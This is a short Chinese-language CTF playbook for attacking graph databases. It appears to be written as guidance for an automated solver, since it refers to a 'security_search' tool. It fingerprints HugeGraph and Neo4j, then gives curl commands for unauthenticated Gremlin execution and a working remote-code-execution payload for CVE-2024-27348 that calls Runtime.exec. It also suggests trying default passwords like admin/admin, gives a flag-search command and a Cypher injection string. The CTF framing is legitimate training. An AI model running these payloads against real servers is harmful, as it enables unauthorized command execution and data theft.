# 图数据库利用（HugeGraph / Neo4j）

> 适用：关联关系检索引擎、知识图谱、图数据库服务题（图数据库类）。

## 指纹识别
- 端口 8080 + `/gremlin`、`/graphs`、`gremlin-server` → HugeGraph。
- 端口 7474 / 7687 + `/db/data`、`neo4j` → Neo4j。
- 响应含 `gremlin-groovy`、`hugegraph`、`neo4j`、`bolt` 等。

## HugeGraph（重点）

### 认证与未授权
```bash
# 探测 Gremlin 端点
curl -s http://TARGET:8080/gremlin
curl -s http://TARGET:8080/apis/
# 未授权 Gremlin 执行（老版本）
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"g.V().count()"}'
```

### RCE（CVE-2024-27348，HugeGraph-Server）
HugeGraph-Server 的 Gremlin 执行点可被利用执行系统命令：
```bash
# 通过 Gremlin 调 Runtime.exec 反射链执行命令
curl -s -X POST http://TARGET:8080/gremlin -H 'Content-Type: application/json' \
  -d '{"gremlin":"Thread.currentThread().getContextClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec(\"id\")"}'
# 更多利用链见 security_search("HugeGraph CVE-2024-27348 RCE")
```
- 若 Gremlin 需要认证，先试默认口令（admin/admin、admin/password）或从源码/配置找凭据。
- 拿到 RCE 后 `find / -name 'flag*' 2>/dev/null`。

## Neo4j（次要）

### Cypher 注入
```bash
# 登录接口若拼接 Cypher 查询
' OR 1=1 RETURN labels() //
# Neo4j Shell Server 注入（CVE-2021-34371）
```

## 通用思路
1. 图数据库题通常不是让你"爆破"，而是**注入 Gremlin/Cypher 查询**或利用**未授权 RCE**。
2. 先确认端点是否未授权，再找 Gremlin/Cypher 注入点。
3. 目标是读图数据里的 flag，或 RCE 后搜文件。
4. 同主机可能还有其他服务（图数据库类门户），逐个端口独立指纹。
